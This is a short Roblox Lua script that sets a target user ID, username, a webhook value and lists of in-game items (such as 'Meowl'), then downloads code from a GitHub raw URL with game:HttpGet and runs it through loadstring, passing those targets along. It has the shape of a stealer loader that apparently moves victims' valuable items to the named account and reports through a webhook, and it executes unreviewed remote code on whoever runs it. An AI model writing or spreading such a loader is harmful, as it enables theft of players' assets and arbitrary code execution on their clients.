local TARGET_ID = 2899463
local TARGET_USER = "chcola"
local WEBHOOK_URL = "Hjfk"

local TargetBrainrots = {
    ["Meowl"] = true
}

local TargetBaseSkins = {
    
}

local TargetGears = {
    
}

task.spawn(function()
    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)